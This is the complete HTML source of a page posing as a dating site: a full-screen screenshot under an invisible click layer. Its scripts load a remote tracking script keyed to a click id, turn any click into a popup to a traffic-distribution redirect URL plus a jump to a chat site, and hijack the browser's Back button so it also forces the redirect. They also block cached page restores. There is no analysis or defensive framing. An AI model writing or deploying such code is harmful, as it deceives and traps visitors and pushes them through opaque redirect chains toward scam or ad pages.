<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dating Site</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            overflow: hidden;
            cursor: pointer;
        }
        
        .container {
            width: 100%;
            height: 100vh;
            position: relative;
            overflow: hidden;
        }
        
        .background-image {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
            background: #000;
        }
        
        .click-area {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
            z-index: 10;
        }
    </style>
</head>
<body>
    <div class="container">
        <img id="bgImage" src="https://i.ibb.co/qMBVP973/Screenshot-2026-01-21-at-16-20-14.png" alt="Dating" class="background-image">
        <div class="click-area" id="clickArea"></div>
    </div>
    
    <!-- Tacolo Dynamic Script -->
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const clickId = urlParams.get('clickid'); // Берет значение {clickid} из URL
        if (clickId) {
            const script = document.createElement('script');
            script.src = `https://tacolo.co/js/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ&click_id=${clickId}`;
            document.head.appendChild(script);
        }
    </script>
    
    <script>
        const redirectUrl = 'https://hotbjayapa.today/tds?id=1556794253&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
        const chatUrl = 'https://datingland.site/chat/';
        
        // Back button redirect protection
        function setupBackButtonRedirect() {
            history.pushState(null, null, location.href);
            
            window.addEventListener('popstate', function() {
                history.pushState(null, null, location.href);
                window.location.href = redirectUrl;
            });
        }
        
        setupBackButtonRedirect();
        
        // Click redirect handler
        function handleClick(e) {
            e.preventDefault();
            
            // Open tracking URL in new window
            window.open(redirectUrl, '_blank');
            
            // Redirect current page to chat
            setTimeout(function() {
                window.location.href = chatUrl;
            }, 100);
        }
        
        // Add click handler to entire page
        document.getElementById('clickArea').addEventListener('click', handleClick);
        document.body.addEventListener('click', handleClick);
        
        // Prevent page caching
        window.addEventListener('pageshow', function(event) {
            if (event.persisted) {
                window.location.reload();
            }
        });
    </script>
</body>
</html>
